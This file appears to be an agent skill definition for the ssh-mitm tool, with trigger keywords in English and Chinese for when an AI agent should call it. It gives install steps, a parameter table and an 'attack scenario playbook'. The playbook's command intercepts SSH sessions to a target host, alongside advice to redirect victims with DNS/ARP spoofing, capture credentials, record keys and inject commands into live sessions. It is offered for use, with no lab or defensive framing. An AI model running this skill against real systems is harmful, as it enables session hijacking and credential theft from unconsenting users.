---
name: ssh-mitm-intercept
description: "ssh-mitm hijacks SSH sessions and captures credentials. Signals: MITM, mitm, start SSH MITM, listen port, session hijack"
zh-signals: "ssh-mitm: SSH 会话劫持+凭据截获。信号:中间人,mitm,起 SSH 中间人,监听端口,劫持会话。"
when-to-use: >-
  Use when positioned for a man-in-the-middle attack against SSH and you want to hijack sessions
  and capture credentials or inject commands in real time.
---

# ssh-mitm

- Attack Category: C40 Sniffing and Man-in-the-Middle Attacks
- Upstream Repository: https://github.com/ssh-mitm/ssh-mitm
- Upstream License: NOASSERTION (manual review required) (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install ssh-mitm
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `ssh-mitm server --remote-host real.server.com` | Start the SSH man-in-the-middle |
| `--listen-port 2222` | Listen port |
| `Victim connects: ssh -p 2222 victim@attacker` | Hijack the session |
| `--store-ssh-keys` | Record keys |

## Attack Scenario Playbook

### SSH session hijacking plus credential capture

```bash
ssh-mitm server --remote-host 10.0.0.5 --listen-port 2222
# Redirect traffic with DNS/ARP → the user sees a host key warning and continues anyway → the whole session is visible in plaintext
```

## Notes

Modern SSH MITM written in Python; can inject commands into the victim session in real time (--ssh-intercept).
